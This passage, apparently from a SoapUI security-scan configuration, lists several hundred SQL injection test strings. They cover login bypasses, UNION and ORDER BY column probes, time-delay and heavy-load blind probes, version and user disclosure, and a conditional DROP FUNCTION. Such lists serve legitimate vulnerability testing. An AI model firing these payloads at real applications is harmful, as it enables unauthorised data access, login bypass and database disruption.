1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24# </con:sqlInjectionStrings><con:sqlInjectionStrings>")) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>\</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>`</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""^"</con:sqlInjectionStrings><con:sqlInjectionStrings>" or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1,2--+</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>-- or #</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>' or '' '</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22# </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>%00</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7506=9091 AND ('5913=5913</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND false</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>%2c(select%20*%20from%20(select(sleep(10)))a)</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR '' = '</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17# </con:sqlInjectionStrings><con:sqlInjectionStrings>RANDOMBLOB(500000000/2)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 30-- </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>1 AND (SELECT * FROM Users) = 1</con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''-'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''*'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>1' GROUP BY 1,2,--+</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17-- </con:sqlInjectionStrings><con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4</con:sqlInjectionStrings><con:sqlInjectionStrings>or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@,@</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>-- -</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>') or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='X'</con:sqlInjectionStrings><con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 2--+</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26# </con:sqlInjectionStrings><con:sqlInjectionStrings>' OR 1 -- -</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,1,1))='M'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>'='</con:sqlInjectionStrings><con:sqlInjectionStrings>' AnD SLEEP(5) ANd '1</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or "</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>";waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1083=1083 AND ('1427=1427</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>RANDOMBLOB(1000000000/2)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))</con:sqlInjectionStrings><con:sqlInjectionStrings>1' GROUP BY 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>1*56</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""&amp;"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2# </con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' #</con:sqlInjectionStrings><con:sqlInjectionStrings>@@variable</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""-"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT 